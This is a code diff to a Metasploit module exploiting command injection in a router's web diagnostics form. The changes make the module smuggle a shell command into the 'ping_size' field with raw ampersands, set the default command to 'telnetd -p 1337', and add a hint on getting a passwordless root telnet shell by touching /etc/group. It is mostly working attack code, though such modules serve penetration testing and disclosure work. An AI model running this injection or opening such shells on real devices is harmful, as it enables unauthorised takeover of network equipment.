@@ -23,7 +23,8 @@ class Metasploit3 < Msf::Auxiliary
 				not see any output of your command. Try a ping command to your local system for a
 				first test.
 
-				Hint: To get a remote shell you could upload a cross-compiled netcat binary and exec it.
+				Hint: To get a remote shell you could start telnetd and touch /etc/group. Use the 
+				user root without a password for accessing the device.
 			},
 			'Author'          => [ 'm-1-k-3' ],
 			'License'         => MSF_LICENSE,
@@ -35,14 +36,13 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'OSVDB', '89912' ],
 					[ 'BID', '57760' ]
 				],
-			'DefaultTarget'  => 0,
 			'DisclosureDate' => 'Feb 05 2013'))
 
 		register_options(
 			[
 				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
 				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
-				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1'])
+				OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])
 			], self.class)
 	end
 
@@ -90,7 +90,6 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'    => uri,
 					'method' => 'POST',
 					'authorization' => basic_auth(user,pass),
-					'encode_params' => false,
 					'vars_post' => {
 						"submit_button" => "Diagnostics",
 						"change_action" => "gozila_cgi",
@@ -98,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
 						"action" => "",
 						"commit" => "0",
 						"ping_ip" => "1.1.1.1",
-						"ping_size" => "%26#{cmd}%26",
+						"ping_size" => "&#{cmd}&",
 						"ping_times" => "5",
 						"traceroute_ip" => ""
 						}
